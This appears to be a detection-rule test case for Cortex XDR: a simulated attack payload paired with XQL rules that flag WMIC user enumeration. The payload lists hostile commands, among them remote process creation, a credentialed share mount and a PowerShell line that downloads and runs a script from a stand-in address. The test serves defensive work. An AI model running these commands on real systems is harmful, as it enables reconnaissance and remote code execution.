identity.description: An attacker uses WMIC to enumerate users on a target host, followed by attempting to establish a remote connection using PowerShell. Cortex should detect the WMIC process execution and associated network activity.

payload.code:
wmic useraccount get name,fullname,sid
powershell -command "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c echo test > C:\\temp\\test.txt'"
net use \\192.0.2.100\\share /user:domain\\user password
powershell -command "IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.100/payload.ps1')"

biocs.name: Discovery of host users via WMIC
biocs.description: Detection of WMIC execution with user enumeration arguments
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'wmic.exe'
| filter action_process_command_line contains 'useraccount get'

abiocs.name: Suspicious WMIC command line with user enumeration

abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'wmic.exe'
| filter action_process_command_line contains 'useraccount get'

xql_queries.name: WMIC User Discovery Detection
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'wmic.exe'
| filter action_process_command_line contains 'useraccount get'
| fields agent_hostname, actor_process_image_name, action_process_command_line
